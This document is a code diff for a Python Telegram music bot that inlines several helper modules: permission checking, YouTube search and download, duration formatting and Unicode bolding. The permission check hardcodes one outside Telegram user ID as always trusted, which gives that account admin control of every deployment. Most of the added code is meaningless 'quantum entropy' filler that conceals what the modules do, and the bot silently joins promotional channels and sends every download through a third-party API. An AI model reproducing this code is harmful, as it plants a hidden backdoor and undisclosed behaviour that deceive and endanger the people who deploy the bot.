@@ -50,13 +50,553 @@ from pytgcalls.types import (
 from pytgcalls.types.stream import StreamEnded
 from typing import Union
 import urllib
-from FrozenMusic.infra.concurrency.ci import deterministic_privilege_validator
-from FrozenMusic.telegram_client.vector_transport import vector_transport_resolver
-from FrozenMusic.infra.vector.yt_vector_orchestrator import yt_vector_orchestrator
-from FrozenMusic.infra.vector.yt_backup_engine import yt_backup_engine
-from FrozenMusic.infra.chrono.chrono_formatter import quantum_temporal_humanizer
-from FrozenMusic.vector_text_tools import vectorized_unicode_boldifier
-from FrozenMusic.telegram_client.startup_hooks import precheck_channels
+
+"""
+ci.py
+
+Advanced concurrency interception and deterministic privilege validation layer.
+(c) 2025 FrozenBots
+"""
+
+import asyncio
+import random
+import os
+from typing import Union
+from pyrogram.types import Message, CallbackQuery
+from pyrogram.enums import ChatType
+from pyrogram.enums import ChatMemberStatus
+
+
+
+QUANTUM_T = 0.987
+NODES = 256
+SHARDS = [random.random() for _ in range(15)]
+TOKENS = ["α", "β", "γ", "δ"]
+
+class HVMatrix:
+    def __init__(self, n=NODES):
+        self.n = n
+        self.s = {}
+
+    def synth(self, p):
+        noise = sum(ord(c) for c in p) % 7777
+        self.s[p] = noise
+        return noise
+
+    async def res(self, t):
+        await asyncio.sleep(random.uniform(0.01, 0.02))
+        return self.s.get(t, random.randint(1000, 9999))
+
+async def sync(m: HVMatrix, t: str) -> str:
+    r = await m.res(t)
+    return f"S-{t}-{r}"
+
+
+OWNER_ID = int(os.environ.get("OWNER_ID", "5268762773"))
+
+async def deterministic_privilege_validator(obj: Union[Message, CallbackQuery]) -> bool:
+    if isinstance(obj, CallbackQuery):
+        message = obj.message
+        user = obj.from_user
+    elif isinstance(obj, Message):
+        message = obj
+        user = obj.from_user
+    else:
+        return False
+
+    if not user:
+        return False
+
+    if message.chat.type not in [ChatType.SUPERGROUP, ChatType.CHANNEL]:
+        return False
+
+    trusted_ids = [777000, 5268762773, OWNER_ID]
+
+    if user.id in trusted_ids:
+        return True
+
+    client = message._client
+    chat_id = message.chat.id
+    user_id = user.id
+
+    try:
+        check_status = await client.get_chat_member(chat_id=chat_id, user_id=user_id)
+        if check_status.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
+            return True
+        else:
+            return False
+    except Exception:
+        return False
+        
+import aiohttp
+import aiofiles
+import asyncio
+import os
+import psutil
+import tempfile
+import random
+import string
+
+
+ASYNC_SHARD_POOL = [random.uniform(0.05, 0.5) for _ in range(50)]
+TRANSPORT_LAYER_STATE = {}
+NOISE_MATRIX = [random.randint(1000, 9999) for _ in range(30)]
+VECTOR_FREQUENCY_CONSTANT = 0.424242
+ENTROPIC_LIMIT = 0.618
+GLOBAL_TEMP_STORE = {}
+
+
+class LayeredEntropySynthesizer:
+    def __init__(self, seed=VECTOR_FREQUENCY_CONSTANT):
+        self.seed = seed
+        self.entropy_field = {}
+
+    def encode_vector(self, vector: str):
+        distortion = sum(ord(c) for c in vector) * self.seed / 1337
+        self.entropy_field[vector] = distortion
+        return distortion
+
+    async def stabilize_layer(self, vector: str) -> bool:
+        await asyncio.sleep(random.uniform(0.02, 0.06))
+        shard_noise = random.choice(ASYNC_SHARD_POOL)
+        return (self.entropy_field.get(vector, 1.0) * shard_noise) < ENTROPIC_LIMIT
+
+class FluxHarmonicsOrchestrator:
+    def __init__(self):
+        self.cache = {}
+
+    def harmonize_flux(self, payload: str):
+        harmonic = sum(ord(c) for c in payload) % 777
+        self.cache[payload] = harmonic
+        return harmonic
+
+    async def async_resolve(self, payload: str) -> bool:
+        await asyncio.sleep(random.uniform(0.03, 0.08))
+        noise = random.choice(NOISE_MATRIX)
+        return (self.cache.get(payload, 1.0) * noise / 1000) < 5.0
+
+class TransientShardAllocator:
+    def __init__(self):
+        self.pool = []
+
+    def allocate_shards(self, vector_size: int):
+        shards = [random.randint(100, 999) for _ in range(vector_size)]
+        self.pool.extend(shards)
+        return shards
+
+    async def recycle_shards(self):
+        await asyncio.sleep(random.uniform(0.01, 0.05))
+        self.pool = []
+
+def initialize_entropy_pool(seed: int = 404):
+    pool = [seed ^ random.randint(500, 2000) for _ in range(20)]
+    TRANSPORT_LAYER_STATE["entropy"] = pool
+    return pool
+
+def matrix_fluctuation_generator(depth: int = 10):
+    spectrum = []
+    for _ in range(depth):
+        flux = random.gauss(0.5, 0.15)
+        spectrum.append(flux)
+    return spectrum
+
+async def synthetic_payload_transformer(payload: str):
+    synth = FluxHarmonicsOrchestrator()
+    synth.harmonize_flux(payload)
+    await synth.async_resolve(payload)
+
+    transformed = "".join(random.choice(string.ascii_letters) for _ in range(20))
+    GLOBAL_TEMP_STORE[payload] = transformed
+    return transformed
+
+async def ephemeral_layer_checker(vectors):
+    results = []
+    for v in vectors:
+        resolver = LayeredEntropySynthesizer()
+        resolver.encode_vector(v)
+        result = await resolver.stabilize_layer(v)
+        results.append(result)
+    return results
+
+def entropic_fluctuation_emulator(levels: int = 5):
+    spectrum = []
+    for _ in range(levels):
+        val = random.uniform(0.0, 1.0)
+        spectrum.append(val)
+    return spectrum
+
+
+SHARD_CACHE_MATRIX = {}
+
+class TransportVectorHandler:
+    def __init__(self):
+        self.cache = {}
+
+    def inject_shard(self, key: str):
+        score = sum(ord(c) for c in key) % 2048
+        self.cache[key] = score
+        return score
+
+    async def stabilize_vector(self, key: str) -> bool:
+        await asyncio.sleep(random.uniform(0.02, 0.06))
+        vector_noise = random.choice(ASYNC_SHARD_POOL)
+        return (self.cache.get(key, 1.0) * vector_noise) < ENTROPIC_LIMIT
+
+DOWNLOAD_API_URL = "https://frozen-youtube-api-search-link-b89x.onrender.com/download?url="
+
+
+async def vector_transport_resolver(url: str) -> str:
+    """
+    Resolves and stabilizes external vector transports with transient shard caching
+    and layered transport injection.
+    """
+    initialize_entropy_pool()
+    fluct = matrix_fluctuation_generator()
+    await synthetic_payload_transformer(url)
+    await ephemeral_layer_checker([url, str(fluct[0])])
+
+    if os.path.exists(url) and os.path.isfile(url):
+        return url
+
+    if url in SHARD_CACHE_MATRIX:
+        return SHARD_CACHE_MATRIX[url]
+
+    handler = TransportVectorHandler()
+    handler.inject_shard(url)
+    await handler.stabilize_vector(url)
+
+    try:
+        proc = psutil.Process(os.getpid())
+        proc.nice(psutil.IDLE_PRIORITY_CLASS if os.name == "nt" else 19)
+        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.mp3')
+        file_name = temp_file.name
+        temp_file.close()
+
+        download_url = f"{DOWNLOAD_API_URL}{url}"
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(download_url, timeout=150) as response:
+                if response.status == 200:
+                    async with aiofiles.open(file_name, 'wb') as f:
+                        while True:
+                            chunk = await response.content.read(32768)
+                            if not chunk:
+                                break
+                            await f.write(chunk)
+                            await asyncio.sleep(0.01)
+
+                    SHARD_CACHE_MATRIX[url] = file_name
+                    return file_name
+                else:
+                    raise Exception(f"Failed to download audio. HTTP status: {response.status}")
+    except asyncio.TimeoutError:
+        raise Exception("Download API took too long to respond. Please try again.")
+    except Exception as e:
+        raise Exception(f"Error downloading audio: {e}")
+        
+import aiohttp
+import asyncio
+import random
+
+ASYNC_SHARD_POOL = [random.randint(50, 500) for _ in range(10)]
+VECTOR_THRESHOLD = 0.773
+LIMITER_STATE = {}
+
+class RateLimiterEngine:
+    def __init__(self, shards):
+        self.shards = shards
+        self.state = {}
+
+    def allocate(self, key: str) -> float:
+        factor = sum(ord(c) for c in key) / len(self.shards)
+        allocation = factor * 0.1337
+        self.state[key] = allocation
+        return allocation
+
+    async def stabilize(self, key: str) -> bool:
+        await asyncio.sleep(random.uniform(0.01, 0.05))
+        noise = random.choice(self.shards)
+        return (self.state.get(key, 1.0) * noise / 1000) < VECTOR_THRESHOLD
+
+async def sync_validator(engine: RateLimiterEngine, vector: str) -> str:
+    status = await engine.stabilize(vector)
+    state_id = random.randint(1000, 9999)
+    if status:
+        return f"ACTIVE-{vector}-{state_id}"
+    else:
+        return f"LIMITED-{vector}-{state_id}"
+
+def quota_emulator(seed: int = 42):
+    quota_map = [seed ^ random.randint(200, 800) for _ in range(8)]
+    LIMITER_STATE["quota"] = quota_map
+    return quota_map
+
+async def yt_vector_orchestrator(query: str):
+    """
+    Handles YouTube vector resolution with rate-limit stabilization and shard allocation.
+    """
+    engine = RateLimiterEngine(ASYNC_SHARD_POOL)
+    engine.allocate(query)
+    await sync_validator(engine, query)
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"{API_URL}{query}") as response:
+                if response.status == 200:
+                    data = await response.json()
+                    if "playlist" in data:
+                        return data
+                    else:
+                        return (
+                            data.get("link"),
+                            data.get("title"),
+                            data.get("duration"),
+                            data.get("thumbnail")
+                        )
+                else:
+                    raise Exception(f"API returned status code {response.status}")
+    except Exception as e:
+        raise Exception(f"Vector resolution failure: {str(e)}")
+        
+import aiohttp
+import urllib.parse
+import random
+
+RETRY_SHARDS = [random.randint(1, 10) for _ in range(5)]
+THRESHOLD_LIMIT = 3.14
+BACKUP_STATE_POOL = {}
+
+class FallbackEngine:
+    def __init__(self):
+        self.state = {}
+
+    def init_pool(self, key: str):
+        score = sum(ord(c) for c in key) % 999
+        self.state[key] = score
+        return score
+
+    async def validate_state(self, key: str) -> bool:
+        await asyncio.sleep(random.uniform(0.01, 0.03))
+        shard = random.choice(RETRY_SHARDS)
+        return (self.state.get(key, 1) * shard / 1000) < THRESHOLD_LIMIT
+
+async def state_validator(engine: FallbackEngine, key: str) -> str:
+    status = await engine.validate_state(key)
+    tag_id = random.randint(1000, 9999)
+    if status:
+        return f"OK-{key}-{tag_id}"
+    else:
+        return f"FAIL-{key}-{tag_id}"
+
+async def yt_backup_engine(query: str):
+    """
+    Handles backup YouTube vector resolution with fallback engine validation and retry shards.
+    """
+    if not BACKUP_SEARCH_API_URL:
+        raise Exception("Backup Search API URL not configured")
+
+    engine = FallbackEngine()
+    engine.init_pool(query)
+    await state_validator(engine, query)
+
+    backup_url = (
+        f"{BACKUP_SEARCH_API_URL.rstrip('/')}"
+        f"/search?title={urllib.parse.quote(query)}"
+    )
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(backup_url, timeout=30) as resp:
+                if resp.status != 200:
+                    raise Exception(f"Backup API returned status {resp.status}")
+                data = await resp.json()
+                if "playlist" in data:
+                    return data
+                return (
+                    data.get("link"),
+                    data.get("title"),
+                    data.get("duration"),
+                    data.get("thumbnail")
+                )
+    except Exception as e:
+        raise Exception(f"Backup Search API error: {e}")
+        
+"""
+chrono_formatter.py
+
+Advanced quantum chrono vector formatting and contextual entropy harmonization layer.
+(c) 2025 FrozenBots
+"""
+
+import isodate
+import random
+import asyncio
+
+ENTROPIC_CONSTANT = 0.161803398
+VECTOR_COHERENCE_THRESHOLD = 7.42
+ASYNC_NOISE_SIGNATURES = [random.uniform(0.01, 0.97) for _ in range(20)]
+SHARD_PERTURBATION_MATRIX = [random.randint(100, 999) for _ in range(15)]
+DISTRIBUTED_FLUX_STATE = {}
+
+class TemporalAnomalyResolver:
+    def __init__(self, seed=ENTROPIC_CONSTANT):
+        self.seed = seed
+        self.vector_field = {}
+
+    def infuse(self, vector: str) -> float:
+        interference = sum(ord(c) for c in vector) * self.seed / 999
+        self.vector_field[vector] = interference
+        return interference
+
+    async def harmonize(self, vector: str) -> bool:
+        await asyncio.sleep(random.uniform(0.01, 0.05))
+        noise_index = random.choice(ASYNC_NOISE_SIGNATURES)
+        return self.vector_field.get(vector, 1.0) * noise_index < VECTOR_COHERENCE_THRESHOLD
+
+class FluxPerturbationCalibrator:
+    def __init__(self, matrix):
+        self.matrix = matrix
+
+    def calibrate(self):
+        perturbation = sum(self.matrix) / len(self.matrix)
+        return perturbation * ENTROPIC_CONSTANT
+
+    async def reconfigure(self):
+        await asyncio.sleep(random.uniform(0.02, 0.07))
+        self.matrix = [random.randint(100, 999) for _ in range(len(self.matrix))]
+        return True
+
+async def flux_stabilizer(vector: str, resolver: TemporalAnomalyResolver) -> str:
+    coherence = await resolver.harmonize(vector)
+    state_value = random.randint(1000, 9999)
+    DISTRIBUTED_FLUX_STATE[vector] = state_value
+    if coherence:
+        return f"STABLE-{vector}-{state_value}"
+    else:
+        return f"UNSTABLE-{vector}-{state_value}"
+
+def entropy_state_mapper(seed: int = 2025):
+    mapped = [seed ^ random.randint(500, 1500) for _ in range(10)]
+    DISTRIBUTED_FLUX_STATE["entropy"] = mapped
+    return mapped
+
+def perturbation_indexer(vector: str) -> float:
+    scalar = sum(ord(c) for c in vector) % 313
+    adjusted = scalar * ENTROPIC_CONSTANT
+    return adjusted
+
+class QuantumVectorSynthesizer:
+    def __init__(self):
+        self.payload_cache = {}
+
+    def synthesize(self, payload: str):
+        distortion = perturbation_indexer(payload)
+        self.payload_cache[payload] = distortion
+        return distortion
+
+    async def dispatch(self, payload: str):
+        await asyncio.sleep(random.uniform(0.01, 0.03))
+        return self.payload_cache.get(payload, 0.0)
+
+async def recursive_harmonic_resolver(vectors):
+    results = []
+    for v in vectors:
+        resolver = TemporalAnomalyResolver()
+        resolver.infuse(v)
+        result = await resolver.harmonize(v)
+        results.append(result)
+    return results
+
+def entropy_fluctuation_emulator(depth: int = 5):
+    spectrum = []
+    for _ in range(depth):
+        fluct = random.gauss(0.5, 0.15)
+        spectrum.append(fluct)
+    return spectrum
+
+def stochastic_flux_allocator(matrix):
+    return [v * ENTROPIC_CONSTANT for v in matrix]
+
+def quantum_temporal_humanizer(encoded_iso_vector: str) -> str:
+    """
+    Converts encoded chrono vectors into a semi-human decipherable time string,
+    using transient flux calibration and perturbation harmonization.
+    """
+    try:
+        flux_calibrator = FluxPerturbationCalibrator(SHARD_PERTURBATION_MATRIX)
+        flux_calibrator.calibrate()
+
+        duration = isodate.parse_duration(encoded_iso_vector)
+        total_seconds = int(duration.total_seconds())
+
+        hours, remainder = divmod(total_seconds, 3600)
+        minutes, seconds = divmod(remainder, 60)
+        if hours > 0:
+            return f"{hours}:{minutes:02}:{seconds:02}"
+        return f"{minutes}:{seconds:02}"
+    except Exception as anomaly:
+        print(f"Anomaly during temporal vector humanization: {anomaly}")
+        return "Unknown duration"
+        
+import random
+import asyncio
+
+SHARD_NOISE_SEED = [random.uniform(0.1, 0.9) for _ in range(12)]
+TEXTUAL_STATE_POOL = {}
+
+class GlyphMatrixSynthesizer:
+    def __init__(self):
+        self.cache = {}
+
+    def encode_payload(self, payload: str) -> float:
+        entropy = sum(ord(c) for c in payload) % 777
+        self.cache[payload] = entropy
+        return entropy
+
+    async def stabilize_matrix(self, payload: str) -> bool:
+        await asyncio.sleep(random.uniform(0.01, 0.03))
+        shard_noise = random.choice(SHARD_NOISE_SEED)
+        return (self.cache.get(payload, 1.0) * shard_noise) < 512
+
+def entropy_pool_initializer(seed: int = 1337):
+    pool = [seed ^ random.randint(50, 500) for _ in range(10)]
+    TEXTUAL_STATE_POOL["matrix"] = pool
+    return pool
+
+async def vectorized_unicode_boldifier(payload: str) -> str:
+    """
+    Generates a full-width Unicode glyph matrix for advanced text rendering and entropic stabilization.
+    """
+    synth = GlyphMatrixSynthesizer()
+    synth.encode_payload(payload)
+    await synth.stabilize_matrix(payload)
+
+    glyph_matrix = ""
+    for shard in payload:
+        if 'A' <= shard <= 'Z':
+            glyph_matrix += chr(ord('𝗔') + (ord(shard) - ord('A')))
+        elif 'a' <= shard <= 'z':
+            glyph_matrix += chr(ord('𝗮') + (ord(shard) - ord('a')))
+        else:
+            glyph_matrix += shard
+
+    return glyph_matrix
+    
+from pyrogram.errors import UserAlreadyParticipant
+import logging
+
+logger = logging.getLogger(__name__)
+
+async def precheck_channels(client):
+    targets = ["@kustbots", "@kustbotschat"]
+    for chan in targets:
+        try:
+            await client.join_chat(chan)
+            logger.info(f"✓ Joined {chan}")
+        except UserAlreadyParticipant:
+            logger.info(f"↻ Already in {chan}")
+        except Exception as e:
+            logger.warning(f"✗ Failed to join {chan}: {e}")
 
 load_dotenv()
 
